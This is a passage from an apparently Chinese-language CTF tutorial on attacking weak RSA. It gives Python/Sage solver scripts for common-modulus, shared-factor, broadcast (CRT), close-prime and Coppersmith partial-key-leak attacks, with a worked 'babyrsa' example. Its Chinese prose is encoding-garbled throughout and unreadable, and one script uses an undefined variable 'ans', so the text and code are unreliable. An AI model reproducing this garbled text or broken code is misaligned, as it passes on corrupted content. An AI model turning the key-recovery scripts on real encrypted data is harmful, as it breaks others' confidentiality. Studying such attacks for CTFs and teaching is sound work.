å¯†åŒä¸€æ®µæ˜æ–‡<code>m</code>ï¼Œå¹¶ä¸”ä½¿ç”¨ç›¸åŒçš„æ¨¡<code>n</code>ã€‚<br><strong>åˆ†æï¼š</strong><br>æ­¤æ—¶å·²çŸ¥ä¸¤ä¸ªä¸åŒçš„<code>e1,e2</code>ï¼Œæ‰€ä»¥ä¸éœ€è¦å†æ±‚<code>d</code>äº†ï¼Œè¿™é‡Œä½¿ç”¨<strong>æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•</strong>ï¼Œæ±‚å‡º$k_1e_1+k_2e_2 &#x3D; 1$ï¼ˆè‹¥æ­¤æ—¶e1ï¼Œe2ä¸äº’ç´ ï¼Œä¹Ÿä¸€èˆ¬æœ‰è¾ƒå°çš„å…¬å› æ•°ï¼Œå¼€å°æ¬¡æ–¹å³å¯ï¼‰ã€‚<br>æ‰€ä»¥$c_1^{k_1}c_2^{k_2} \equiv m^{k_1e_1+k_2e_2} \equiv m \mod n$<br><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å…±æ¨¡æ”»å‡»ï¼ˆmç›¸åŒï¼Œnç›¸åŒï¼Œeä¸åŒï¼‰</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>c1= <br>c2= <br>e1= <br>e2= <br>n= <br><br>_ , k1 , k2 = gmpy2.gcdext(e1,e2)<br>m = <span class="hljs-built_in">pow</span>(c1,k1,n)*<span class="hljs-built_in">pow</span>(c2,k2,n) % n<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="å…¬å…±å› å­æ”»å‡»"><a href="#å…¬å…±å› å­æ”»å‡»" class="headerlink" title="å…¬å…±å› å­æ”»å‡»"></a>å…¬å…±å› å­æ”»å‡»</h2><p>åŸæœ¬è§‰å¾—å¤ªç®€å•æ˜¯ä¸æƒ³æ”¾çš„ï¼Œä½†æ˜¯åæ¥è€ƒè™‘åˆ°è®¸å¤šé¢˜éƒ½æ˜¯ä½¿ç”¨äº†ç±»ä¼¼çš„æ€æƒ³ï¼Œæ‰€ä»¥æœ¬é¢˜å‹çš„é‡ç‚¹æ˜¯å­¦ä¼šåˆ©ç”¨ <strong>å…¬å› æ•°</strong> æ±‚è§£ä¸€ç³»åˆ—é—®é¢˜ã€‚è¿™é‡Œä»¥æœ€ç®€å•çš„RSAä¸ºä¾‹ã€‚<br><strong>é—®é¢˜ï¼š</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å·²çŸ¥n1,n2,e,cæ±‚m</span><br>n1 = p*q1<br>n2 = p*q2<br>e = <br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m,e,n1)<br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>å¯ä»¥çœ‹å‡º$p$æ˜¯$n_1,n_2$çš„å…¬å…±å› å­ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ±‚ä¸¤è€…çš„æœ€å¤§å…¬å› æ•°æ¥æ±‚$p$<br>$å³p&#x3D;gcd(n_1,n_2)$<br><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å…¬å…±å› å­æ”»å‡»</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#å·²çŸ¥é‡</span><br>n1= <br>n2=<br>c = <br>e =<br><br>p=GCD(n1,n2)<br>q1=n1//p<br>phi=(p-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)<br>d=inverse(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n1)<br>ans=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="ä½åŠ å¯†æŒ‡æ•°æ”»å‡»ï¼ˆeå¾ˆå°ï¼‰"><a href="#ä½åŠ å¯†æŒ‡æ•°æ”»å‡»ï¼ˆeå¾ˆå°ï¼‰" class="headerlink" title="ä½åŠ å¯†æŒ‡æ•°æ”»å‡»ï¼ˆeå¾ˆå°ï¼‰"></a>ä½åŠ å¯†æŒ‡æ•°æ”»å‡»ï¼ˆeå¾ˆå°ï¼‰</h2><h3 id="1-å•ç»„-ï¼ˆeï¼Œnï¼Œcï¼‰"><a href="#1-å•ç»„-ï¼ˆeï¼Œnï¼Œcï¼‰" class="headerlink" title="1.å•ç»„$ï¼ˆeï¼Œnï¼Œcï¼‰$"></a>1.å•ç»„$ï¼ˆeï¼Œnï¼Œcï¼‰$</h3><p><strong>åˆ†æï¼š</strong> ä¸ç”¨å¤šè¯´ï¼Œè¿™ç§é¢˜ä¸€èˆ¬åªéœ€è¦<strong>ç›´æ¥å¼€æ–¹</strong>æˆ–è€…<strong>å°èŒƒå›´çˆ†ç ´</strong></p><h3 id="2-å¤šç»„-ï¼ˆeï¼Œn-iï¼Œc-iï¼‰-ï¼ˆä¹Ÿå«åšå¹¿æ’­æ”»å‡»ï¼‰"><a href="#2-å¤šç»„-ï¼ˆeï¼Œn-iï¼Œc-iï¼‰-ï¼ˆä¹Ÿå«åšå¹¿æ’­æ”»å‡»ï¼‰" class="headerlink" title="2.å¤šç»„$ï¼ˆeï¼Œn_iï¼Œc_iï¼‰$ï¼ˆä¹Ÿå«åšå¹¿æ’­æ”»å‡»ï¼‰"></a>2.å¤šç»„$ï¼ˆeï¼Œn_iï¼Œc_iï¼‰$ï¼ˆä¹Ÿå«åšå¹¿æ’­æ”»å‡»ï¼‰</h3><p><strong>åˆ†æï¼š</strong> </p><ul><li><strong>æ€è·¯ä¸€ï¼š</strong> å¯ä»¥å…ˆåˆ†æå„ä¸ª$n$ä¹‹é—´æ˜¯å¦æœ‰<strong>å…¬å…±å› å­</strong>ï¼Œå¦‚æœæœ‰ï¼Œå¯ä»¥ä½¿ç”¨ä¸Šè¾¹çš„å…¬å…±å› å­æ”»å‡»ã€‚</li><li><strong>æ€è·¯äºŒï¼š</strong> ä½¿ç”¨<strong>ä¸­å›½å‰©ä½™å®šç†ï¼ˆCRTï¼‰</strong>ï¼Œé€šè¿‡ä¸­å›½å‰©ä½™å®šç†ï¼Œå¯ä»¥æ›´åŠ é€¼è¿‘æ­£ç¡®çš„$n$ã€‚ä¸­å›½å‰©ä½™å®šç†æ±‚å‡ºæ¥ä¸€ç»„$(nï¼Œc)$ï¼Œæ­¤æ—¶æ”»å‡»æ–¹æ³•ä¾¿å’Œå•ç»„çš„ä¸€æ ·äº†ã€‚<br><strong>ä»£ç ï¼š</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#ä¸­å›½å‰©ä½™å®šç†</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>n_list=[...]<br>c_list=[...]<br>e = <br><br>n = <span class="hljs-number">1</span><br>n_list_2 = []<br>n_list_2_inv = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> n_list:<br>Â  Â  n *= i<br>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> n_list:<br>Â  Â  tmp = n // i<br>Â  Â  tmp_inv = inverse(tmp,i)<br>Â  Â  n_list_2.append(tmp)<br>Â  Â  n_list_2_inv.append(tmp_inv)<br>  <br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c_list)):<br>Â  Â  c += c_list[i]*n_list_2[i]*n_list_2_inv[i] % n<br>c = c % n<br><br>m = gmpy2.iroot(c,e)[<span class="hljs-number">0</span>]<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">for k in range(1000) #è‡ªå®šä¹‰çˆ†ç ´kçš„èŒƒå›´</span><br><span class="hljs-string">c = c + k*n</span><br><span class="hljs-string">t = gmpy2.iroot(c,e)</span><br><span class="hljs-string">if t[1]:</span><br><span class="hljs-string">m = t[0]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="p-qç›¸è¿‘"><a href="#p-qç›¸è¿‘" class="headerlink" title="p,qç›¸è¿‘"></a>p,qç›¸è¿‘</h2><p><strong>å·²çŸ¥ï¼š</strong> $n,c$ï¼Œä¸”pï¼Œqæ˜¯ååˆ†æ¥è¿‘çš„ç´ æ•°ï¼Œæˆ–è€…æ˜¯ç›¸é‚»çš„ç´ æ•°<br><strong>è§£æ³•ï¼š</strong></p><ul><li><strong>ä¸€ã€</strong> factordbã€yafuç›´æ¥åˆ†è§£n</li><li><strong>äºŒã€</strong> å…ˆå¯¹nå¼€å¹³æ–¹å¾—åˆ°å¤§æ¦‚å€¼ï¼Œå†ä½¿ç”¨<code>gmpy2</code>ä¸­çš„<code>next_prime()</code>æ¥è·å–<code>q</code>ï¼Œæ­¤æ—¶<code>p=n//q</code><br><strong>ä»£ç ï¼š</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>n = ...<br>c = ...<br>e = <span class="hljs-number">65537</span><br><br>q = gmpy2.iroot(n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>q = gmpy2.next_prime(q)<br>p = n // q<br><span class="hljs-comment">#print(p*q)</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = long_to_bytes(ans)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="Coppersmithæ”»å‡»"><a href="#Coppersmithæ”»å‡»" class="headerlink" title="Coppersmithæ”»å‡»"></a>Coppersmithæ”»å‡»</h2><p><strong>ä»‹ç»ï¼š</strong> Coppersmithæ–¹æ³•åŸºäº<strong>LLLç®—æ³•</strong>æ±‚å¤šé¡¹å¼<strong>å°æ ¹</strong>ï¼Œæ±‚â€œ<strong>å·²çŸ¥æŸäº›äºŒè¿›åˆ¶ä½ï¼Œæ±‚å‰©ä½™ä½</strong>â€é—®é¢˜ï¼Œ<br><strong>åŠŸèƒ½ï¼š</strong> å‡å¦‚æœ‰ä¸€ä¸ª$e$é˜¶çš„å¤šé¡¹å¼$f$ï¼Œåˆ™æœ‰</p><ul><li>åœ¨æ¨¡$n$ä¸‹ï¼Œå¯ä»¥ç”¨$O(\log n)$çš„ç®—æ³•æ±‚å‡º$n^{\frac1e}$ä»¥å†…çš„æ ¹</li><li>ç»™å®š$\beta$ï¼Œå¿«é€Ÿæ±‚å‡ºæ¨¡$b$ä¸‹çš„å°æ ¹ï¼ˆå…¶ä¸­$b\geq n^\beta$ï¼Œä¸”$b$æ˜¯$n$çš„å› æ•°ï¼‰</li></ul><p> <strong>å®ç°ï¼š</strong> åœ¨$Sagemath$ä¸­ä½¿ç”¨<code>small_roots()</code>æ–¹æ³•å®ç°ã€‚</p><h3 id="Pé«˜ä½æ³„éœ²ï¼Œæ±‚ä½ä½"><a href="#Pé«˜ä½æ³„éœ²ï¼Œæ±‚ä½ä½" class="headerlink" title="Pé«˜ä½æ³„éœ²ï¼Œæ±‚ä½ä½"></a>Pé«˜ä½æ³„éœ²ï¼Œæ±‚ä½ä½</h3><p><strong>åˆ†æï¼š</strong> åˆ©ç”¨Coppersmithï¼Œæ­¤æ—¶$p&#x3D;pHigh+x$ï¼Œåˆ™æœ‰$\frac 1e&#x3D;1$ ,<br>ä»¤$p\equiv 0 \mod b$ ï¼Œå…¶ä¸­$n^\beta \leq b \leq n$ ,<br>è‹¥æƒ³$b&#x3D;p$ï¼Œåˆ™éœ€è¦$p\geq n^\beta$ ï¼Œç”±äºRSAä¸­$p,q$ ä¸€èˆ¬ä½æ•°ç›¸è¿‘ï¼Œéƒ½åœ¨$n^{0.5}$ï¼Œæ‰€ä»¥ä¸€èˆ¬å–$\beta \in [0.1,0.4]$ã€‚</p><blockquote><p>æ®è¯´$p$çš„æ³„éœ²ä½æ•°$\frac{pHigh.nbits()}{p.nbits()}$è¦å¤§äº<strong>0.56</strong>å·¦å³æ‰èƒ½è§£å‡ºï¼Œå¯¹512bitsçš„$p$æ¥è¯´éœ€è¦288ä½å·²çŸ¥ï¼Œå¯¹1024bitsçš„$p$æ¥è¯´è¦576ä½å·¦å³ã€‚</p></blockquote><p><strong>ä»£ç å®ç°ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>n=<br>p_high=<br>pbits=<br>kbits=pbits-p_high.nbits()  <span class="hljs-comment">#å°æ ¹ä½æ•°</span><br><br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>p_high &lt;&lt;= kbits<br>p = p_high + x <br>roots = p.small_roots(X=<span class="hljs-number">2</span>^kbits,beta=<span class="hljs-number">0.4</span>)<br><br>p = p_high + <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>])<br><br>q = n // p<br></code></pre></td></tr></table></figure><h4 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h4><p>ï¼ˆé¹¤åŸæ¯ 2021 babyrsaï¼‰<br><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, bytes_to_long<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>e = <span class="hljs-number">65537</span><br>hint1 = p &gt;&gt; <span class="hljs-number">724</span><br>hint2 = q % (<span class="hljs-number">2</span> ** <span class="hljs-number">265</span>)<br>ct = <span class="hljs-built_in">pow</span>(bytes_to_long(flag), e, n)<br><span class="hljs-built_in">print</span>(hint1)<br><span class="hljs-built_in">print</span>(hint2)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(ct)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span><br><span class="hljs-string">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span><br><span class="hljs-string">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span><br><span class="hljs-string">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>å·²çŸ¥pçš„é«˜1024-724 &#x3D; 300ä½ï¼Œä»¥åŠqçš„ä½265ä½ã€‚å·²çŸ¥çš„pçš„é«˜300ä½è¿œå°äº576ä½ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥ç”¨coppersmithå®šç†ï¼Œéœ€è¦æ‰¾åˆ°æ›´å¤šçš„å·²çŸ¥ä½æ•°ã€‚<br>ç”±$n &#x3D; pq$å¾—ï¼Œ$n\equiv p_lq_l\mod 2^{265}$<br>æ‰€ä»¥å¾—ï¼Œ$p_l \equiv nq_l^{-1} \mod 2^{265}$<br>æ±‚å‡ºäº†pçš„ä½265ä½ï¼Œæ­¤æ—¶å·²çŸ¥265+300 &#x3D; 565ï¼Œå¾ˆæ¥è¿‘576ä½ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰äº›è·ç¦»ï¼Œè¿›è¡Œå‡ ä½çˆ†ç ´ã€‚<br><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span><br>p_high = <span class="hljs-number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span><br>q_low = <span class="hljs-number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span><br>c = <span class="hljs-number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span><br>e = <span class="hljs-number">65537</span><br>mod_num = <span class="hljs-number">2</span>^<span class="hljs-number">265</span><br><br>p_low = inverse(q_low,mod_num)*n % mod_num<br><br>pbits = <span class="hljs-number">1024</span><br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>^<span class="hljs-number">6</span>):<br><span class="hljs-comment">#è¿™é‡Œå¯¹p_highå¾€ä½å‡ ä½è¿›è¡Œçˆ†ç ´ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å¯¹p_lowå¾€é«˜å‡ ä½è¿›è¡Œçˆ†ç ´ï¼Œæ³¨æ„kbitsçš„å˜åŒ–å³å¯ã€‚</span><br>    p_high1 = p_high &lt;&lt; <span class="hljs-number">6</span><br>    p_high1 = p_high1 + i<br>    kbits = pbits - p_high1.nbits()<br>    p_high1 &lt;&lt;= kbits<br>    p_bar = p_high1 + p_low<br>    kbits = kbits - p_low.nbits()<br><br>    p = p_bar + x*mod_num  <span class="hljs-comment">#å› ä¸ºä½ä½ä»¥åŠçŸ¥é“ï¼Œxæ˜¯ä¸­é—´çš„æ•°ï¼Œå› æ­¤å‘å·¦ç§»265ä½</span><br>    p = p.monic()          <span class="hljs-comment">#è½¬æ¢æˆé¦–ä¸€å¤šé¡¹å¼ï¼Œsmall_rootsåªèƒ½å¤„ç†é¦–ä¸€å¤šé¡¹å¼</span><br>    <span class="hljs-built_in">print</span>(i)<br>    roots = p.small_roots(X = <span class="hljs-number">2</span>^kbits,beta = <span class="hljs-number">0.4</span>)<br>    <span class="hljs-keyword">if</span> roots:<br>        p = p_bar + <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>])*mod_num<br>        <span class="hljs-built_in">print</span>(p)<br>        <span class="hljs-keyword">if</span> n%p == <span class="hljs-number">0</span>:<br>            q = n // p<br>            phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>            d = inverse(e,phi)<br>            m = <span class="hljs-built_in">pow</span>(c,d,n)<br>            ans = long_to_bytes(m)<br>            <span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h3 id="mé«˜ä½æ³„éœ²ï¼Œæ±‚ä½ä½"><a href="#mé«˜ä½æ³„éœ²ï¼Œæ±‚ä½ä½" class="headerlink" title="mé«˜ä½æ³„éœ²ï¼Œæ±‚ä½ä½"></a>mé«˜ä½æ³„éœ²ï¼Œæ±‚ä½ä½</h3><p><strong>åˆ†æï¼š</strong> åˆ©ç”¨coppersmithæ–¹æ³•ï¼Œå¯ä»¥æ„é€ $(m_{high}+x)^e-c\equiv 0 \mod n$ ï¼Œæ­¤æ—¶æœ‰$b \geq n^{\beta}$ ï¼Œå› æ­¤å–$\beta &#x3D; 1$ ã€‚<br><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>c = <br>e = <br>m_high =<br>mbits =<br><br>kbits = mbits - m_high.nbits()<br>m_high &lt;&lt;= kbits<br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = (m_high + x)^e - c<br>f=f.monic()<br>roots = f.small_roots(X = <span class="hljs-number">2</span> ^ kbits,beta = <span class="hljs-number">1</span>)<br>m = m_high + roots[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h3 id="dpé«˜ä½æ³„éœ²"><a href="#dpé«˜ä½æ³„éœ²" class="headerlink" title="dpé«˜ä½æ³„éœ²"></a>dpé«˜ä½æ³„éœ²</h3><p><strong>å·²çŸ¥ï¼š</strong> $d_{ph},e,n,c$ï¼Œæ±‚$dp$ï¼Œä»è€Œæ±‚æ˜æ–‡<br><strong>åˆ†æï¼š</strong><br>è¿™é‡Œåˆ†æƒ…å†µè®¨è®ºï¼Œåˆ†åˆ«è®°ä¸º <strong>$e$è¾ƒå¤§çš„æƒ…å†µ</strong> å’Œ <strong>$e$è¾ƒå°çš„æƒ…å†µ</strong>ã€‚</p><ul><li><strong>1.$e$è¾ƒå¤§</strong>ï¼šä½¿ç”¨äºŒå…ƒcoppersmithæ±‚è§£ï¼Œå¯ä»¥æ±‚å‡º$d_p$ï¼Œä¹‹åå°±åˆ©ç”¨è´¹é©¬å°å®šç†ï¼Œå¾—åˆ°$a^{e\cdot d_p}\equiv a\mod p$ï¼Œæ‰€ä»¥$p&#x3D;gcd(a^{e\cdot d_p}-a,n)$</li><li><strong>2.$e$è¾ƒå°ï¼š</strong> å› ä¸º$e\cdot d_p\equiv 1\mod (p-1)$ï¼Œæ‰€ä»¥æœ‰$ed_p&#x3D;k(p-1)+1$ï¼Œå³$ed_p+k-1\equiv 0\mod p(ç”±d_p&lt;p-1å¯å¾—k\in(1,e))$ã€‚ä»¤$tmp &#x3D; e^{-1}\mod n$ï¼Œåˆ™$tmp\cdot ed_p+tmp(k-1)\equiv 0\mod p$ï¼Œå³$d_p+tmp(k-1)\equiv 0 \mod n$ã€‚å¯¹$k$è¿›è¡Œçˆ†ç ´ï¼Œåˆ©ç”¨coppersmithå®šç†æ±‚$d_p$ä½ä½<br><strong>ä»£ç ï¼š</strong><br>1.$e$è¾ƒå¤§ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">small_roots</span>(<span class="hljs-params">f, bounds, m=<span class="hljs-number">1</span>, d=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> d:<br>        d = f.degree()<br>        <span class="hljs-built_in">print</span>(d)<br>    R = f.base_ring()<br>    N = R.cardinality()<br>    f /= f.coefficients().pop(<span class="hljs-number">0</span>)<br>    f = f.change_ring(ZZ)<br>    G = <span class="hljs-type">Sequence</span>([], f.parent())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m + <span class="hljs-number">1</span>):<br>        base = N ^ (m - i) * f ^ i<br>        <span class="hljs-keyword">for</span> shifts <span class="hljs-keyword">in</span> 